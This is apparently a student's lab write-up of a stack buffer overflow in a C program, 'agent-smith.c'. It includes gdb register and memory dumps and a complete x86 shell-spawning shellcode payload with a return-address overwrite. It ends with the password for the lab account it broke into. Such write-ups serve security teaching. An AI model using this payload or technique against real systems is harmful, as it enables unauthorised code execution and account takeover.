Question 1

The vulnerability came from the use of "fread()" in "agent-smith.c" because a user can rewrite the "rip" if they know where the address is.

What I did:

invoke -d agent-smith pwnzerized
b 18 (setting a breakpoint so code does not complete)
run
info registers (checking for the ebp, which is the sfp...)

(gdb) info registers
eax            0x53     83
ecx            0xffffffff       -1
edx            0xb7fd38b8       -1208141640
ebx            0xb7fd2000       -1208147968
esp            0xbffff6f0       0xbffff6f0
ebp            0xbffff798       0xbffff798
esi            0x0      0
edi            0x0      0
eip            0x8048553        0x8048553 <display+167>
eflags         0x282    [ SF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51


By running "info registers" I identify that the ebp is 0xbffff798.

My plan now is to write the shellcode into the msg[128] and then flood the rest of it with garbage values.
Then, I will also flood the ebp with more garbage values.
Last, I will make the rip be the address of the beginning of the shellcode.

To make it easy, I will make the beginning of the shellcode be at the beginning of the msg[128].
To identify the address of msg[128], I do "x/60x msg" and identify the address to be at "0xbffff708".
Now I know that I will inject the shellcode starting from "0xbffff708" and then inject the rest with garbage values until I reach the rip, which is +4 above the ebp.
For the rip, I will write in "\x08\xf7\xff\xbf", which is "0xbffff708"
I add a "\xaa" garbage value in front of the shellcode because the very beginning is cut off.

Therfore, I will inject: b"\xaa\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xf7\xff\xbf".

After writing my script, the memory now looks like this:

(gdb) x/60x msg
0xbffff708:     0x895e1feb      0xc0310876      0x89074688      0x0bb00c46
0xbffff718:     0x4e8df389      0x0c568d08      0xdb3180cd      0xcd40d889
0xbffff728:     0xffdce880      0x622fffff      0x732f6e69      0x41414168
0xbffff738:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff748:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff758:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff768:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff778:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff788:     0x00000098      0x41414141      0x41414141      0x41414141
0xbffff798:     0x41414141      0xbffff708      0xbffff957      0x00000000
0xbffff7a8:     0x08048599      0xb7fd2000      0x08048590      0x00000000
0xbffff7b8:     0x00000000      0xb7e454d3      0x00000002      0xbffff854
0xbffff7c8:     0xbffff860      0xb7fdc858      0x00000000      0xbffff81c
0xbffff7d8:     0xbffff860      0x00000000      0x0804824c      0xb7fd2000
0xbffff7e8:     0x00000000      0x00000000      0x00000000      0x57b13b31


After exploiting the code, I was able to login as "brown".
His message in README is "Never send a human to do a machine's job."
His username is "brown" and his password is "Zsps7Z):".
